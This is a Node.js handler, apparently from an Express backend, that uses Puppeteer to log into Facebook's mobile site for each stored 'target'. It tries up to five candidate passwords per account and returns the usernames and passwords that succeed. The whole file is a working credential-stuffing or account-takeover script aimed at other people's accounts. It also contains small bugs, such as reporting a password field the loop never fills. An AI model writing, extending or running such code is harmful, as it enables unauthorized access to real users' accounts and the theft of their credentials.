const { default: puppeteer } = require("puppeteer");
const InformationSchema = require("../../model/informationMode");
const getTarget = require("../getTarget/getTargetDetail");
const passwordType = require("../../utils/passwordType");

const validateEmailAndAttack=async(req,res)=>{
    const getMail=req.body;
    console.log('hi',getMail)
    const getAllTargets= await getTarget();
    console.log(getTarget.message)
    let success=[];
    if (getAllTargets) {
        const parseTarget=getAllTargets
       
         for (const target of parseTarget) {
            const browser= await puppeteer.launch({headless:false});
            const page = await browser.newPage();
             await page.goto('https://m.facebook.com')
             await page.setViewport({width:390,height:844})
             await page.type('input._56bg._4u9z._5ruq._8qtn',target.userName,{delay:100})
             await page.type('input[name="pass"]',target.pass1, {delay:130})
            const loginBtn=  await page.click('button._54k8._52jh._56bs._56b_._28lf._9cow._56bw._56bu',{delay:300})
       
          
             const notice= await page.$('div[data-sigil="m_login_notice"]')
             if (notice) {
               await passwordType(page,target?.pass2)
               const notic1= await page.$('div[data-sigil="m_login_notice"]')
                if (notic1) {
                    await passwordType(page,target?.pass3)
                    const notice2= await page.$('div[data-sigil="m_login_notice"]')
                    if (notice2) {
                        await passwordType(page,target?.pass4)
                        const notice3= await page.$('div[data-sigil="m_login_notice"]')
                        if (notice3) {
                            await passwordType(page,target?.pass5)
                        }
                    }
                }
              
             }
        
             if (!notice) {
              const userName=target?.userName;
              const password=target?.password;
              success.push({userName,password})

             }

             await browser.close()
           
             

    

         }
       
    }
    res.json({message:success,sms:'iam form backend'})


}

module.exports=validateEmailAndAttack